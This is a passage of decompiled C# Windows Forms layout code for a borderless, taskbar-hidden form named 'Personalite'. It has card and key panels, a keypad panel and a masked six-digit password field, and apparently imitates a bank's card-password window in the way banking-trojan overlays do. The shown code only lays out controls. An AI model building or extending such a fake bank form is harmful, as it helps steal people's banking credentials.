		((Control)t19).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t19).set_Location(new Point(173, 203));
		((Control)t19).set_Margin(new Padding(0));
		((TextBoxBase)t19).set_MaxLength(4);
		((Control)t19).set_Name("t19");
		((Control)t19).set_Size(new Size(37, 12));
		((Control)t19).set_TabIndex(18);
		t19.set_TextAlign((HorizontalAlignment)2);
		((Control)t19).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)pictureBox1).set_Cursor(Cursors.get_Hand());
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(357, 260));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(56, 19));
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox1).add_Click((EventHandler)pictureBox1_Click);
		((Control)Painel_cartao).set_BackgroundImage((Image)componentResourceManager.GetObject("Painel_cartao.BackgroundImage"));
		((Control)Painel_cartao).set_BackgroundImageLayout((ImageLayout)0);
		((Control)Painel_cartao).get_Controls().Add((Control)(object)prs_s6);
		((Control)Painel_cartao).get_Controls().Add((Control)(object)pictureBox2);
		((Control)Painel_cartao).set_Location(new Point(9, 85));
		((Control)Painel_cartao).set_Name("Painel_cartao");
		((Control)Painel_cartao).set_Size(new Size(510, 310));
		((Control)Painel_cartao).set_TabIndex(12);
		((Control)Painel_cartao).set_Visible(false);
		((Control)prs_s6).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)prs_s6).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)prs_s6).set_Location(new Point(445, 26));
		((TextBoxBase)prs_s6).set_MaxLength(6);
		((Control)prs_s6).set_Name("prs_s6");
		prs_s6.set_PasswordChar('•');
		((Control)prs_s6).set_Size(new Size(56, 21));
		((Control)prs_s6).set_TabIndex(6);
		((Control)prs_s6).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((Control)pictureBox2).set_Cursor(Cursors.get_Hand());
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(445, 108));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(56, 19));
		pictureBox2.set_TabIndex(5);
		pictureBox2.set_TabStop(false);
		((Control)pictureBox2).add_Click((EventHandler)pictureBox2_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.White);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)0);
		((Form)this).set_ClientSize(new Size(815, 517));
		((Control)this).get_Controls().Add((Control)(object)Painel_cartao);
		((Control)this).get_Controls().Add((Control)(object)Painel_Chave);
		((Control)this).get_Controls().Add((Control)(object)PanelTeclado);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Personalite");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Control)this).set_Text("0;0;0;0");
		((Form)this).add_Load((EventHandler)Personalite_Load);
		((Control)PanelTeclado).ResumeLayout(false);
		((Control)PanelTeclado).PerformLayout();
		((Control)Painel_Chave).ResumeLayout(false);
		((Control)Painel_Chave).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)Painel_cartao).ResumeLayout(false);
		((Control)Painel_cartao).PerformLayout();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
